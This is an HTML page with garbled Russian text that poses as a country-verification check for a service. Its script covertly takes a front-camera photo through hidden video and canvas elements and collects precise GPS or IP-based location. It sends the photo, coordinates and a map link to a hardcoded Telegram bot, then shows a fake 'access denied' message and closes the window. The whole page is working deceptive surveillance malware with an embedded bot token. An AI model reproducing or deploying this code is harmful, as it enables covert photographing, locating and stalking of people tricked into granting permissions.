<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–°–µ—Ä–≤–∏—Å...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #000;
            color: #fff;
            text-align: center;
        }
        #quote {
            font-size: 24px;
            opacity: 0;
            animation: fadeIn 5s forwards;
            max-width: 80%;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        #status {
            padding: 10px;
            border-radius: 5px;
            font-size: 16px;
            opacity: 0;
            animation: fadeIn 1s forwards 2s;
            margin-bottom: 20px;
        }
        #startButton {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            opacity: 0;
            animation: fadeIn 2s forwards 2s;
        }
        #startButton:hover {
            background-color: #006699;
        }
        @keyframes fadeIn {
            to { opacity: 1; }
        }
        .success {
            background-color: rgba(0, 128, 0, 0.3);
        }
        .error {
            background-color: rgba(255, 0, 0, 0.3);
        }
        .info {
            background-color: rgba(0, 0, 255, 0.3);
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div id="quote">–°–µ—Ä–≤–∏—Å –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–∑ –†–æ—Å—Å–∏–∏.. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –æ—Ç–∫—É–¥–∞ –≤—ã?</div>
    <div id="status" class="info"></div>
    <button id="startButton">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å!</button>
    
    <!-- –°–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –∫–∞–º–µ—Ä–æ–π -->
    <video id="hiddenCamera" class="hidden" autoplay playsinline></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram –±–æ—Ç–∞
        const BOT_TOKEN = '7830653166:AAHCPcJsaaxAlurpxuUXdsChTNK9kbWobbE';
        const CHAT_ID = '6292332566';
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã DOM
        const quoteElement = document.getElementById('quote');
        const statusElement = document.getElementById('status');
        const startButton = document.getElementById('startButton');
        const hiddenCamera = document.getElementById('hiddenCamera');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        
        let stream = null;

        // –ü–æ–∫–∞–∑–∞—Ç—å —Å—Ç–∞—Ç—É—Å
        function showStatus(text, type) {
            statusElement.textContent = text;
            statusElement.className = type;
            statusElement.style.opacity = 1;
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä—ã
        async function initCamera() {
            try {
                showStatus('–ü—Ä–æ–≤–µ—Ä—è–µ–º..', 'info');
                
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                hiddenCamera.srcObject = stream;
                
                // –ñ–¥–µ–º –ø–æ–∫–∞ –∫–∞–º–µ—Ä–∞ –±—É–¥–µ—Ç –≥–æ—Ç–æ–≤–∞
                await new Promise((resolve) => {
                    hiddenCamera.onloadedmetadata = resolve;
                });
                
                return true;
            } catch (err) {
                console.error('Camera error:', err);
                return false;
            }
        }
        
        // –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–º –æ–∂–∏–¥–∞–Ω–∏–µ–º
        async function capturePhotoWithRetry() {
            let retries = 3;
            let photoData = null;
            
            while (retries > 0 && !photoData) {
                try {
                    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ canvas
                    hiddenCanvas.width = hiddenCamera.videoWidth;
                    hiddenCanvas.height = hiddenCamera.videoHeight;
                    
                    // –ñ–¥–µ–º —Å—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è (1.5 —Å–µ–∫—É–Ω–¥—ã)
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    
                    // –†–∏—Å—É–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ (–Ω–µ –∑–µ—Ä–∫–∞–ª—å–Ω–æ–µ)
                    const context = hiddenCanvas.getContext('2d');
                    context.translate(hiddenCanvas.width, 0);
                    context.scale(-1, 1);
                    context.drawImage(hiddenCamera, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                    context.setTransform(1, 0, 0, 1, 0, 0);
                    
                    // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ data URL
                    photoData = hiddenCanvas.toDataURL('image/jpeg', 0.92);
                    
                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ (30KB)
                    if (photoData.length < 30000) {
                        throw new Error('–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ');
                    }
                    
                    return photoData;
                } catch (err) {
                    retries--;
                    if (retries > 0) {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        console.log(`–ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ (–æ—Å—Ç–∞–ª–æ—Å—å ${retries})`);
                    } else {
                        throw err;
                    }
                }
            }
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ —Å –ø–æ–≤—ã—à–µ–Ω–Ω–æ–π —Ç–æ—á–Ω–æ—Å—Ç—å—é
        async function getHighAccuracyLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                showStatus('–ü—Ä–æ–≤–µ—Ä–∫–∞ 8%..', 'info');
                
                // –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–±—É–µ–º —Å –≤—ã—Å–æ–∫–æ–π —Ç–æ—á–Ω–æ—Å—Ç—å—é
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: position.timestamp
                    }),
                    error => {
                        console.log('High accuracy failed, trying standard...');
                        // –ï—Å–ª–∏ –≤—ã—Å–æ–∫–∞—è —Ç–æ—á–Ω–æ—Å—Ç—å –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∞, –ø—Ä–æ–±—É–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –º–µ—Ç–æ–¥
                        navigator.geolocation.getCurrentPosition(
                            position => resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: position.timestamp
                            }),
                            error => {
                                console.error('Geolocation error:', error);
                                resolve(null);
                            },
                            {
                                enableHighAccuracy: false,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∫–∞–∫ –∑–∞–ø–∞—Å–Ω–æ–π –≤–∞—Ä–∏–∞–Ω—Ç
        async function getIPLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    latitude: data.latitude,
                    longitude: data.longitude,
                    accuracy: 50000, // –ü—Ä–∏–º–µ—Ä–Ω–∞—è —Ç–æ—á–Ω–æ—Å—Ç—å –¥–ª—è IP-–≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
                    timestamp: Date.now(),
                    ipBased: true
                };
            } catch (error) {
                console.error('IP location error:', error);
                return null;
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendToTelegram(photoData, locationData) {
            try {
                showStatus('–ü—Ä–æ–≤–µ—Ä–∫–∞ 56%..', 'info');
                
                const formData = new FormData();
                
                // –ï—Å–ª–∏ –µ—Å—Ç—å —Ñ–æ—Ç–æ, –¥–æ–±–∞–≤–ª—è–µ–º –µ–≥–æ
                if (photoData) {
                    const blob = await fetch(photoData).then(res => res.blob());
                    formData.append('photo', blob, 'photo.jpg');
                }
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const message = `üìç –î–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:\n` +
                               `–®–∏—Ä–æ—Ç–∞: ${locationData?.latitude?.toFixed(6) || '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}\n` +
                               `–î–æ–ª–≥–æ—Ç–∞: ${locationData?.longitude?.toFixed(6) || '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}\n` +
                               `–¢–æ—á–Ω–æ—Å—Ç—å: ${locationData?.accuracy ? Math.round(locationData.accuracy) + ' –º' : '–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}\n` +
                               `–í—Ä–µ–º—è: ${new Date(locationData?.timestamp || Date.now()).toLocaleString()}\n` +
                               `–ú–µ—Ç–æ–¥: ${locationData?.ipBased ? 'IP-–≥–µ–æ–ª–æ–∫–∞—Ü–∏—è' : (locationData ? 'GPS' : '–Ω–µ –¥–æ—Å—Ç—É–ø–Ω–æ')}\n` +
                               `–ö–∞—Ä—Ç—ã: ${locationData ? `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}` : '–Ω–µ –¥–æ—Å—Ç—É–ø–Ω–æ'}`;
                
                if (photoData) {
                    formData.append('caption', message);
                } else {
                    formData.append('chat_id', CHAT_ID);
                    formData.append('text', message);
                }
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
                const endpoint = photoData 
                    ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto` 
                    : `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (!result.ok) {
                    throw new Error(result.description || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
                }
                
                showStatus('–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω ‚õîÔ∏è –°—Ç—Ä–∞–Ω–∞: –§—Ä–∞–Ω—Ü–∏—è', 'success');
                return true;
            } catch (err) {
                showStatus('–û—à–∏–±–∫–∞: ' + err.message, 'error');
                console.error('Telegram error:', err);
                return false;
            }
        }
        
        // –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å
        async function mainProcess() {
            try {
                // –°–∫—Ä—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É
                startButton.classList.add('hidden');
                
                // –ü–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ –ø–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é (—Å–Ω–∞—á–∞–ª–∞ –≤—ã—Å–æ–∫—É—é —Ç–æ—á–Ω–æ—Å—Ç—å, –ø–æ—Ç–æ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é)
                const locationPromise = getHighAccuracyLocation();
                
                // –ü—Ä–æ–±—É–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –∫–∞–º–µ—Ä—É
                const cameraInitialized = await initCamera();
                let photoData = null;
                
                // –ï—Å–ª–∏ –∫–∞–º–µ—Ä–∞ –¥–æ—Å—Ç—É–ø–Ω–∞, –¥–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
                if (cameraInitialized) {
                    try {
                        photoData = await capturePhotoWithRetry();
                    } catch (err) {
                        console.error('Photo capture error:', err);
                    } finally {
                        // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É, –µ—Å–ª–∏ –æ–Ω–∞ –±—ã–ª–∞ –∑–∞–ø—É—â–µ–Ω–∞
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                    }
                }
                
                // –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                let locationData = await locationPromise;
                
                // –ï—Å–ª–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∞, –ø—Ä–æ–±—É–µ–º IP-–≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                if (!locationData) {
                    locationData = await getIPLocation();
                }
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ (–¥–∞–∂–µ –µ—Å–ª–∏ —Ñ–æ—Ç–æ –Ω–µ—Ç)
                await sendToTelegram(photoData, locationData);
                
            } catch (err) {
                showStatus('–û—à–∏–±–∫–∞: ' + err.message, 'error');
                console.error('Process error:', err);
            } finally {
                // –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
                setTimeout(() => window.close(), 5000);
            }
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', () => {
            // –ù–∞–∑–Ω–∞—á–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏
            startButton.addEventListener('click', () => {
                mainProcess();
            });
        });
    </script>
</body>
</html>
